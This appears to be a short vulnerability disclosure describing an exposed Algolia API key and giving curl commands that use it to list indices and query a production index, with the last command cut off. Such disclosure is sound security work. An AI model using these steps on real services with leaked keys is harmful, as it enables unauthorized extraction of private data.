## Use case

The vulnerability involved an exposed Algolia API key that allowed unauthenticated access to sensitive production, staging, and draft datasets. This exposure could lead to unauthorized data extraction and enumeration of internal indices.

## Steps to test

1. Extract the Algolia API key from the client-side configuration file.
2. Use the extracted key to enumerate available indices by sending a GET request to 'https://REDACTED-dsn.algolia.net/1/indexes/' with the appropriate headers.
3. Identify sensitive indices such as production and staging datasets from the response.
4. Send a POST request to query a sensitive index (e.g., 'prod_RF_SITE') using the extracted API key and application ID.
5. Analyze the response to check if sensitive data is returned without authentication.

## Commands

```text
curl -H 'X-Algolia-API-Key: <KEY>' -H 'X-Algolia-Application-Id: REDACTED' 'https://REDACTED-dsn.algolia.net/1/indexes/'
curl -X POST 'https://REDACTED-dsn.algolia.net/1/indexes/prod_RF_SITE/query' -H 'X-Algolia-API-Key: <KEY>' -H 'X-Algolia-Application-Id: REDACTED' -H 'Content-Type: application/json' -d '{"query":"","hitsPerPage":5}'
curl \
-H "X-Algolia-API-Key: <KEY>" \

-H "Content-Type: application/json" \
```
